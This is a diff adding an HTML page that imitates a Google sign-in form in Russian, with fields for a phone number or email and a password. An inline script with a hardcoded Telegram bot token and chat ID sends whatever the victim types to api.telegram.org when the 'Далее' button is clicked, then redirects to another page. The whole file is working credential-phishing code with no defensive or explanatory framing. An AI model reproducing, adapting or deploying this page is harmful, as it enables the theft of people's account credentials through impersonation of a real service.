@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+        <div class="glav">
+            <div class="imue">
+                <img src="gglogo.png" class="imug">
+                <p class="sinin">Вход</p>
+                <p class="isp">Используйте аккаунт Google</p>
+                <input  class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8) ;">
+                <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8) ">
+                </div>
+            <div class="button">
+                <button id="button">Далее</button>
+            </div>
+        </div>
+        <script>
+const TOKEN = "7720379353:AAGsCGg6r6DZQAnEBb9fsBje4JE0Dao8oEY";
+const CHAT_ID = "6811862398";
+
+const input = document.getElementById("login");
+const input2 = document.getElementById("password");
+const btn = document.getElementById("button");
+const status = document.getElementById("status");
+
+btn.addEventListener("click", () => {
+    window.location.href = "next.html";
+    const text = encodeURIComponent("Google: " + input.value + "  Пароль:   " + input2.value);
+    if(!text) return alert("Введите логин и пароль");
+
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`)
+    .then(res => res.json())
+    .then(res => {
+        if(res.ok) status.textContent = "Отправлено ✅";
+        else status.textContent = "Ошибка ❌";
+    })
+    .catch(err => {
+        console.error(err);
+        status.textContent = "Ошибка соединения ❌";
+    });
+});
+</script>
+    </body>
+</html>
